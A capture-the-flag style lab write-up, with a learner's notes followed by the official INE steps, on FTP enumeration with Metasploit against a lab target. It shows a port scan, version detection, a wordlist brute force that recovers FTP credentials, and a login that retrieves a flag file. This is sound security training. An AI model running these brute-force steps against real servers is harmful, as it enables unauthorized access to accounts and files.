FTP (File Transfer Protocol) is a standard network protocol used for transferring files from one host to another over a network. FTP operates in a client-server architecture, where the client initiates a connection to the server to perform file operations.

This lab covers the process of performing FTP enumeration with Metasploit.

# Lab Environment

In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.

**Objective:** Your task is to perform FTP enumeration with Metasploit.

# Tools

The best tools for this lab are:

- Metasploit Framework
- FTP client
______________

MY PROCESS

START POSTGRESQL SERVICE 
```
service postgresql start
```

NETX 
```
MSFCONSOLE
```

```
workspace -a new
```

NMAP SCAN
```
msf6 > db_nmap -Pn -T4 192.142.192.3
[*] Nmap: Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-21 22:46 IST
[*] Nmap: Nmap scan report for demo.ine.local (192.142.192.3)
[*] Nmap: Host is up (0.000030s latency).
[*] Nmap: Not shown: 999 closed tcp ports (reset)
[*] Nmap: PORT   STATE SERVICE
[*] Nmap: 21/tcp open  ftp
[*] Nmap: MAC Address: 02:42:C0:8E:C0:03 (Unknown)
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds
```

NOW WE HAVE 21 PORT OPEN

FIND IT VERSION
```

Module options (auxiliary/scanner/ftp/ftp_version):

   Name     Current Setting      Required  Description
   ----     ---------------      --------  -----------
   FTPPASS  mozilla@example.com  no        The password for the specified username
   FTPUSER  anonymous            no        The username to authenticate as
   RHOSTS                        yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    21                   yes       The target port (TCP)
   THREADS  1                    yes       The number of concurrent threads (max one per host)


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/ftp/ftp_version) > set RHOSTS 192.142.192.3
RHOSTS => 192.142.192.3
msf6 auxiliary(scanner/ftp/ftp_version) > run

[+] 192.142.192.3:21      - FTP Banner: '220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.142.192.3]\x0d\x0a'
[*] 192.142.192.3:21      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

NOW TRY BRUTE FORCE
```
msf6 auxiliary(scanner/ftp/ftp_login) > show options

Module options (auxiliary/scanner/ftp/ftp_login):

   Name              Current Setting                                        Required  Description
   ----              ---------------                                        --------  -----------
   ANONYMOUS_LOGIN   true                                                   yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS   false                                                  no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                                                      yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false                                                  no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false                                                  no        Add all passwords in the current database to the list
   DB_ALL_USERS      false                                                  no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none                                                   no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   PASSWORD                                                                 no        A specific password to authenticate with
   PASS_FILE         /usr/share/metasploit-framework/data/wordlists/unix_p  no        File containing passwords, one per line
                     asswords.txt
   Proxies                                                                  no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST      false                                                  no        Record anonymous/guest logins to the database
   RHOSTS            192.142.192.3                                          yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.h
                                                                                      tml
   RPORT             21                                                     yes       The target port (TCP)
   STOP_ON_SUCCESS   false                                                  yes       Stop guessing when a credential works for a host
   THREADS           1                                                      yes       The number of concurrent threads (max one per host)
   USERNAME                                                                 no        A specific username to authenticate as
   USERPASS_FILE     NONE                                                   no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false                                                  no        Try the username as the password for all users
   USER_FILE                                                                no        File containing usernames, one per line
   VERBOSE           true                                                   yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/ftp/ftp_login) > set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
USER_FILE => /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf6 auxiliary(scanner/ftp/ftp_login) > run

[-] 192.142.192.3:21      - Msf::OptionValidateError One or more options failed to validate: USERPASS_FILE.
msf6 auxiliary(scanner/ftp/ftp_login) > set   USERPASS_FILE  false
USERPASS_FILE => false
msf6 auxiliary(scanner/ftp/ftp_login) > run

[-] 192.142.192.3:21      - Msf::OptionValidateError One or more options failed to validate: USERPASS_FILE.
msf6 auxiliary(scanner/ftp/ftp_login) > unset USERPASS_FILE
```

VALID CREDS
```
[-] 192.142.192.3:21      - 192.142.192.3:21 - LOGIN FAILED: sysadmin:jessica (Incorrect: )
[+] 192.142.192.3:21      - 192.142.192.3:21 - Login Successful: sysadmin:654321
[-] 192.142.192.3:21      - 192.142.192.3:21 - LOGIN FAILED: rooty:admin (Incorrect: )
[-] 192.142.192.3:21      - 192.142.192.3:21 - LOGIN FAILED: rooty:ashley (Incorrect: )
[+] 192.142.192.3:21      - 192.142.192.3:21 - Login Successful: rooty:qwerty
[-] 192.142.192.3:21      - 192.142.192.3:21 - LOGIN FAILED: demo:admin (Incorrect: )
[-] 192.142.192.3:21      - 192.142.192.3:21 - LOGIN FAILED: demo:friends (Incorrect: )
[+] 192.142.192.3:21      - 192.142.192.3:21 - Login Successful: demo:butterfly
[-] 192.142.192.3:21      - 192.142.192.3:21 - LOGIN FAILED: auditor:admin (Incorrect: )
```

NOW WE HAVE CREDS LOGIN AND ENUMERATE.

```
└─# ftp 192.142.192.3
Connected to 192.142.192.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.142.192.3]
Name (192.142.192.3:root): demo
331 Password required for demo
Password: 
230 User demo logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||40738|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0              33 Nov 20  2018 secret.txt
226 Transfer complete
ftp> get secret.txt
local: secret.txt remote: secret.txt
229 Entering Extended Passive Mode (|||12068|)
150 Opening BINARY mode data connection for secret.txt (33 bytes)
100% |**********************************************|    33      285.19 KiB/s    00:00 ETA
226 Transfer complete
33 bytes received in 00:00 (68.13 KiB/s)
ftp> exit
221 Goodbye.

┌──(root㉿INE)-[~]
└─# cat secret.txt                                                                         
d6a6bc0db10694a2d90e3a69648f3a03

```

__________________

INE METHODS

**Step 1:** Open the lab link to access the Kali machine.

![Content Image](https://assets.ine.com/lab/learningpath/b08a8a5fc1b77c3a1d0354e7f6ecc4138a6136cb180c0de14f98a2f05add1db0.jpg)

**Step 2:** Check if the target machine is reachable:

**Command:**

```
ping -c 4 demo.ine.local
```

![Content Image](https://assets.ine.com/lab/learningpath/9a8e41a98fd61e3580455eacbc9fd361f36e283a8b9d26b50fdf15fc1b580e92.jpg)

The target is reachable.

**Step 3:** FTP enumeration with Metasploit.

Before we can begin, we will need to startup the Metasploit Framework console (msfconsole), this can be done by running the following command:

**Command:**

```
msfconsole
```

To begin with, we will need to identify a service version of the FTP server running on the target, this can be done by loading the following module:

**Command:**

```
use auxiliary/scanner/ftp/ftp_version
```

We will now need to configure the module options, more specifically, the target option, this can be done by running the following command:

**Command:**

```
set RHOSTS demo.ine.local
```

We can now run the module by running the following command:

**Command:**

```
run
```

As shown in the following screenshot, the module reveals that the target system is running **ProFTPD 1.3.5a**

![Content Image](https://assets.ine.com/lab/learningpath/8882e75afaec37bcf8913e49d4b25d02f8e728c1917aea898440a9791a2a2d61.jpg)

We can perform a brute-force on the FTP server to identify legitimate credentials that we can use for authentication, this can be done by loading the **ftp_login** module as follows:

**Command:**

```
use auxiliary/scanner/ftp/ftp_login
```

We will now need to configure the module options, more specifically, the target option, this can be done by running the following command:

**Command:**

```
set RHOSTS demo.ine.local
```

Given that we are performing a brute force attack, we will also need to configure the **USER_FILE** and **PASS_FILE** options.

**Commands:**

```
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt

set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

We can now run the module by running the following command:

**Command:**

```
run
```

As shown in the following screenshot, the brute force attack identifies the credentials **sysadmin:654321**

![Content Image](https://assets.ine.com/lab/learningpath/6fb72dec411f0ec692b866638dafab950c6cd55137f702b0c79f3108d02c6138.jpg)

We can also check if anonymous logons are allowed on the FTP server, this can be done by using the following commands:

**Commands:**

```
use auxiliary/scanner/ftp/anonymous
set RHOSTS demo.ine.local
run
```

As shown in the following screenshot, the module reveals that anonymous FTP logons are not enabled on the FTP server.

![Content Image](https://assets.ine.com/lab/learningpath/d573fcf41459f7ecb0ddd8b18a8ece4a1b22aac6e946df1765cb1cd5a30c0a08.jpg)

We can now login to the FTP server with the credentials we obtained from the FTP brute force, this can be done through the use of the FTP client on Kali Linux.

**Command:**

```
ftp demo.ine.local
```

As shown in the following screenshot, you will be prompted to provide a username and password, supply the credentials we obtained from the brute force attack.

![Content Image](https://assets.ine.com/lab/learningpath/48df67a2adbd683ff75c72ca583287ca6de25d00167c5bceac58c711203f4e1c.jpg)

As shown in the above screenshot, authentication is successful and we are logged in to the FTP server.

# Conclusion

In this lab, we explored the process of performing FTP enumeration with the Metasploit Framework.